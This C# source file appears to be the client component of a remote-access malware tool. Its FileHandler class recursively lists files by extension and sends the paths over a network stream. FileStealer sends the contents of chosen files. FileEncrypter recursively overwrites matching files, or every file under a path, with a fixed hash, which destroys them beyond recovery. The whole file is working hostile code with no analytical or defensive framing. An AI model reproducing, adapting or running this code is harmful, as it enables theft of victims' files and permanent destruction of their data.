using Protocol;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Collections.Generic;

namespace Client3
{
    static class FileHandler
    {
        public static int count { get; set; }
        public static List<string> listPath = new List<string>();

        public static void FileClient(Stream stream, string path, string extension)
        {
            try
            {
                foreach (var file in Directory.GetFiles(path, $"*{extension}", SearchOption.TopDirectoryOnly))
                {
                    listPath.Add(file);
                    count++;
                }
    
                foreach (var dir in Directory.GetDirectories(path))
                {
                    FileClient(stream, dir, extension);
                }
            }
            catch
            {

            }

        }

        public static void FileHandlerClient(Stream stream, string path, string extension)
        {
            FileClient(stream, path, extension);
            stream.WriteString(count.ToString());
            foreach (var file in listPath)
            {
                stream.WriteString(file);
            }

            
        }

        
    }

    static class FileStealer
    {
        public static void SendFile(Stream stream, string pathFile)
        {
            stream.WriteBytes(File.ReadAllBytes(pathFile));
            stream.WriteString(Path.GetExtension(pathFile));
        }
    }

    static class FileEncrypter
    {
        public static void EncryptFile(string path)
        {
            var sha256 = SHA256.Create();


            var textEncrypt = sha256.ComputeHash(Encoding.UTF8.GetBytes("u2whb8gvu34bfv87hgb897GH873R2UFG87GUBG87U2YBG8IU32EVB3EWUIHVCFH8h817uf3g2987gvb2389"));

            File.WriteAllBytes(path, textEncrypt);

        }

        public static void CompuseEncryptSimple(string startPath, string extension)
        {
            try
            {

                foreach (var dir in Directory.GetFiles(startPath, $"*{extension}", SearchOption.TopDirectoryOnly))
                {
                    EncryptFile(dir);
                }

                foreach (var dir in Directory.GetDirectories(startPath))
                {
                    CompuseEncryptSimple(dir, extension);
                }
            }
            catch
            {

            }
        }


        public static void CompuseEncryptSelective(string startPath)
        {
            try
            {

                foreach (var dir in Directory.GetFiles(startPath,"*", SearchOption.TopDirectoryOnly))
                {
                    EncryptFile(dir);
                }

                foreach (var dir in Directory.GetDirectories(startPath))
                {
                    CompuseEncryptSelective(dir);
                }
            }
            catch
            {

            }
        }
    }
}
